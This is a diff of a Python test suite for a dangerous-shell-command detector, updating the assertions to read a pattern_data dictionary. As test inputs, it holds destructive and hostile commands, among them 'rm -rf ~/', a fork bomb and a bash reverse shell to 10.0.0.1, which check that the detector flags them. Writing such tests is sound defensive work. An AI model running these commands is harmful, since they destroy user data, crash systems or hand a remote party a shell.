@@ -106,9 +106,10 @@ class TestDangerousPatterns(TestCase):
     """Test dangerous command detection."""
 
     def test_rm_home(self):
-        is_dangerous, msg = check_dangerous("rm -rf ~/")
+        is_dangerous, pattern_data = check_dangerous("rm -rf ~/")
         self.assertTrue(is_dangerous)
-        self.assertIn("home", msg.lower())
+        self.assertIsNotNone(pattern_data)
+        self.assertIn("home", pattern_data['message'].lower())
 
     def test_rm_home_variable(self):
         is_dangerous, _ = check_dangerous("rm -rf $HOME")
@@ -123,9 +124,10 @@ class TestDangerousPatterns(TestCase):
         self.assertTrue(is_dangerous)
 
     def test_fork_bomb(self):
-        is_dangerous, msg = check_dangerous(":(){ :|:& };:")
+        is_dangerous, pattern_data = check_dangerous(":(){ :|:& };:")
         self.assertTrue(is_dangerous)
-        self.assertIn("fork bomb", msg.lower())
+        self.assertIsNotNone(pattern_data)
+        self.assertIn("fork bomb", pattern_data['message'].lower())
 
     def test_reverse_shell(self):
         is_dangerous, _ = check_dangerous("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1")
@@ -309,9 +311,10 @@ class TestChainedCommandAnalysis(TestCase):
     """Test analysis of chained commands."""
 
     def test_dangerous_in_chain_detected(self):
-        is_dangerous, msg = check_all_commands("ls && rm -rf ~/")
+        is_dangerous, pattern_data = check_all_commands("ls && rm -rf ~/")
         self.assertTrue(is_dangerous)
-        self.assertIn("chained", msg.lower())
+        self.assertIsNotNone(pattern_data)
+        self.assertIn("chained", pattern_data['message'].lower())
 
     def test_all_safe_chain(self):
         # v1.3.4: Chains where ALL parts match safe patterns get fast-path
